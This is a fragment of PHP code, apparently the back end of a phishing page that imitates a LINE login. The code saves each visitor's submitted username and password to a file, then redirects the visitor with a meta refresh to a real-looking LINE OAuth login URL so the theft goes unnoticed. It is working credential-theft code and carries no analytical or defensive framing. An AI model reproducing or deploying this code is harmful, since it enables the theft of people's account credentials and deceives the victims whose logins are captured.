...
file_put_contents($file, "Username: " . $_POST['tid'] ."\n", FILE_APPEND);
file_put_contents($file, "Password: " . $_POST['tpasswd'] ."\n", FILE_APPEND);
file_put_contents($file, print_r("/////////////////////////////////////////////////////// \n", true), FILE_APPEND);
file_put_contents($file, print_r("\n", true), FILE_APPEND);

?>

 <meta http-equiv="refresh" content="0; url=https://access.line.me/dialog/oauth/weblogin?response_type=code&client_id=1502612786&redirect_uri=https%3A%2F%2Fweb-login-test.herokuapp.com%2Fauth&state=ACDsS66V9Gyi1xfbnHdNQdfggBrM3LCPgs8xJMcVNYY"/> 
